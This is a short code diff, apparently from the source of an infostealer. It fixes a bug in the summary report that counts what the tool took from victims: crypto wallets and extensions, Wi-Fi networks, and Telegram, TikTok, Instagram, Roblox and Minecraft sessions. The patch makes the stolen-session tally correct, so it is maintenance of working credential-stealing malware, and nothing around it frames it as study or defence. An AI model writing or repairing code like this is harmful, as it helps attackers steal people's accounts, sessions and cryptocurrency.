@@ -3054,7 +3054,7 @@
                 "🌐 Wallets/Important extensions": client.config.counter.wallets,
                 "📶 Wifi networks": client.config.counter.wifinetworks,
                 "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
-                "👉 Found TikTok session(s)": client.config.counter.instagram_found,
+                "👉 Found TikTok session(s)": client.config.counter.tiktok_found,
                 "😋 Found Instagram session(s)": client.config.counter.instagram_found,
                 "🤖 Found Roblox session(s)": client.config.counter.roblox_found,
                 "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
